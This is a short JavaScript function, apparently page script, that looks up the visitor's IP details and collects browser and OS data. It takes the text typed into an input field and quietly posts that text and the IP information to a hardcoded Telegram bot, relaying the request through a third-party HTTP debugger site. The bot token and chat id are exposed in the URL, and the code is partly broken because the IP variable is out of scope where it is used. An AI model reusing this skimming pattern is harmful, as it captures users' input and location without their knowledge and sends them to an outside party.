function ss(){
  $.getJSON('https://api.ipregistry.co/?key=tryout', function(data) {
  //alert(JSON.stringify(data, null, 2));
  var ipp=JSON.stringify(data, null, 2);
});
  alert(ipp);
  var platform = navigator.platform;
  var browser = navigator.appName;
  var loc = navigator.language;
  var ua = navigator.userAgent;
  var cljs = new ClientJS();
  var cbrowser = cljs.getBrowser();
  var os = cljs.getOS();
  var text = document.getElementById("inp").value;
  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent(ipp);
  var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
  var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
  var data={"UrlBox":con,
"AgentList" : "Google Chrome",
"VersionsList" : "HTTP/1.1",
"MethodList" : "POST"
  }
  $.ajax({
    type: "POST",
    url: url,
    data: data,
    success: function(){
      console.log("ok");
    }
  
})
}